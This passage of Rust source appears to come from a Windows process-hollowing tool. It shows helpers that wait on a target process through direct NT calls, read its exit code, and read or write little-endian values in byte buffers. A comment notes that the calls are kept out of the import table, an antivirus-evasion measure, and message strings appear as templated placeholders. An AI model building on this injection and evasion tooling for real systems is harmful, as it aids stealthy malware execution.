/// keeps both calls out of the import table.
fn wait_and_exit(process: HANDLE) -> Result<i32, String> {
    let status = crate::nt_wait_for_single_object(process, u32::MAX);
    if status < 0 {
        return Err(nt_error($MSG_WAIT_FAILED$, status));
    }

    let mut info = ProcessBasicInformation::default();
    let mut returned = 0u32;
    let status = crate::nt_query_info_process(
        process,
        0, // ProcessBasicInformation
        &mut info as *mut ProcessBasicInformation as *mut core::ffi::c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut returned,
    );
    let _ = crate::nt_close(process);
    if status < 0 {
        return Err(nt_error($MSG_EXIT_STATUS_FAILED$, status));
    }
    crate::tech_dbg!(
        "process_hollowing",
        "target exited with code {}",
        info.exit_status
    );
    Ok(info.exit_status)
}

// --- Bounds-checked little-endian reads/writes ---

/// `PROCESS_BASIC_INFORMATION` as the kernel lays it out on x64. Only the first
/// field is read (the target's exit status); the rest keeps the layout right so
/// the kernel writes into a correctly sized buffer.
#[repr(C)]
#[derive(Default)]
struct ProcessBasicInformation {
    exit_status: i32,
    _peb_base_address: u64,
    _affinity_mask: u64,
    _base_priority: i32,
    _padding: i32,
    _unique_process_id: u64,
    _parent_process_id: u64,
}

fn read_u16(b: &[u8], off: usize) -> Result<u16, String> {
    let s = b
        .get(
            off..off
                .checked_add(2)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_READ_OOB$)?;
    Ok(u16::from_le_bytes([s[0], s[1]]))
}

fn read_u32(b: &[u8], off: usize) -> Result<u32, String> {
    let s = b
        .get(
            off..off
                .checked_add(4)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_READ_OOB$)?;
    Ok(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

fn read_u64(b: &[u8], off: usize) -> Result<u64, String> {
    let s = b
        .get(
            off..off
                .checked_add(8)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_READ_OOB$)?;
    Ok(u64::from_le_bytes([
        s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
    ]))
}

fn write_u32(b: &mut [u8], off: usize, v: u32) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(4)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_WRITE_OOB$)?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}

fn write_u64(b: &mut [u8], off: usize, v: u64) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(8)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_WRITE_OOB$)?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}
